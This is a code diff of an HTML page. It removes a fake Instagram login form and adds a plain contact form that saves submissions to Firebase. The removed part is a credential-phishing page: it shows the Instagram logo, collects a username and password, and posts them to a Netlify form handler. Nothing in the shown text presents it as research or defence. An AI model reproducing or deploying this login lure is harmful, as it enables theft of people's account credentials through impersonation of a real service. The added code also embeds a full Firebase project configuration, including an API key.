@@ -126,26 +126,44 @@
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-form">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram" class="logo">
-            <form name="login-form" method="POST" data-netlify="true" action="/thank-you">
-                <!-- Hidden field to allow Netlify form processing -->
-                <input type="hidden" name="form-name" value="login-form" />
-                
-                <input type="text" name="username" placeholder="Phone number, username, or email" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit" class="login-btn">Log In</button>
-            </form>
-            <div class="separator">
-                <span>OR</span>
-            </div>
-            <button class="facebook-login-btn">Log in with Facebook</button>
-            <a href="#" class="forgot-password">Forgot password?</a>
-        </div>
-        <div class="signup-container">
-            <span>Don't have an account? <a href="#">Sign up</a></span>
-        </div>
-    </div>
+    <form id="contactForm">
+    <input type="text" name="name" placeholder="Your Name" required>
+    <input type="email" name="email" placeholder="Your Email" required>
+    <textarea name="message" placeholder="Your Message"></textarea>
+    <button type="submit">Submit</button>
+</form>
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
+<script>
+    // Your Firebase config
+    const firebaseConfig = {
+        apiKey: "AIzaSyBQOhH2t5XPieLGlM3anZYco06-PvQt37c",
+          authDomain: "adpsr-75e1f.firebaseapp.com",
+          databaseURL: "https://adpsr-75e1f-default-rtdb.firebaseio.com",
+          projectId: "adpsr-75e1f",
+          storageBucket: "adpsr-75e1f.firebasestorage.app",
+          messagingSenderId: "959425930437",
+          appId: "1:959425930437:web:cd3bae057e5b657a32fcac",
+          measurementId: "G-1X15K2TPH4"
+    };
+
+    // Initialize Firebase
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const form = document.getElementById('contactForm');
+    form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        const formData = new FormData(form);
+        const data = {};
+        formData.forEach((value, key) => {
+            data[key] = value;
+        });
+        firebase.database().ref('submissions').push(data)
+            .then(() => alert('Form submitted successfully!'))
+            .catch(err => console.error('Error:', err));
+    });
+</script>
+
 </body>
 </html>
